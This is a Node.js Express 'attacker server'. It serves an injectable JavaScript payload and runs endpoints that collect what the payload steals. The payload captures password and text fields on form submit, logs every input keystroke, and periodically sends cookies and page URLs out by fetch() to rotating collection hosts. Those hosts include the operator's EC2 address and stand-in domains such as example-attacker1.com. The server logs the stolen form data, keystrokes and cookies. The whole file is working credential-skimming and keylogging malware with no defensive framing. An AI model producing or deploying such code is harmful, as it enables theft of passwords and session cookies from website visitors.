const express = require('express');
const app = express();

// Middleware
app.use(express.json());

// 🔹 Enable CORS
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "*");
  next();
});


// 🔥 1. Serve malicious JS
app.get('/steal-exfil.js', (req, res) => {
  res.setHeader("Content-Type", "application/javascript");

  res.send(`
    (function () {
        const DOMAINS = [
            "http://<your-ec2-ip>:3000",
            "http://example-attacker1.com",
            "http://example-attacker2.net",
            "http://malicious-cdn.xyz",
            "http://data-steal.org"
        ];

        function getDomain() {
            return DOMAINS[Math.floor(Math.random() * DOMAINS.length)];
        }

        // 🔹 Form submission exfiltration
        document.addEventListener("submit", function (e) {
            try {
                const inputs = e.target.querySelectorAll("input");
                let data = {};

                inputs.forEach(input => {
                    if (input.type === "password" || input.type === "text") {
                        data[input.name || input.id || "field"] = input.value;
                    }
                });

                fetch(getDomain() + "/form", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        type: "form_submit",
                        url: window.location.href,
                        data: data
                    })
                });
            } catch (err) {}
        }, true);

        // 🔹 Keylogging
        document.addEventListener("input", function (e) {
            try {
                if (e.target.tagName === "INPUT") {
                    fetch(getDomain() + "/keylog", {
                        method: "POST",
                        body: JSON.stringify({
                            field: e.target.name || e.target.id,
                            value: e.target.value
                        })
                    });
                }
            } catch (err) {}
        });

        // 🔹 Cookie exfiltration
        setInterval(() => {
            try {
                fetch(getDomain() + "/cookie?c=" + encodeURIComponent(document.cookie));
            } catch (err) {}
        }, 50000);

        // 🔹 Background beaconing
        setInterval(() => {
            try {
                fetch(getDomain() + "/beacon?url=" + encodeURIComponent(window.location.href));
            } catch (err) {}
        }, 40000);

    })();
  `);
});


// 🔥 2. Form data endpoint
app.post('/form', (req, res) => {
  console.log("🚨 FORM DATA STOLEN:");
  console.log(JSON.stringify(req.body, null, 2));
  res.sendStatus(200);
});


// 🔥 3. Keylogger endpoint
app.post('/keylog', (req, res) => {
  console.log("⌨️ KEYLOG:");
  console.log(JSON.stringify(req.body, null, 2));
  res.sendStatus(200);
});


// 🔥 4. Cookie endpoint
app.get('/cookie', (req, res) => {
  console.log("🍪 COOKIE:");
  console.log(req.query.c);
  res.sendStatus(200);
});


// 🔥 5. Beacon endpoint
app.get('/beacon', (req, res) => {
  console.log("📡 BEACON:");
  console.log(req.query.url);
  res.sendStatus(200);
});


// 🔹 Catch-all (debugging unexpected calls)
app.use((req, res) => {
  console.log("📦 OTHER REQUEST:");
  console.log(req.method, req.url);
  res.sendStatus(200);
});


// 🚀 Start server
app.listen(3000, () => {
  console.log("🔥 Attacker server running on port 3000");
});
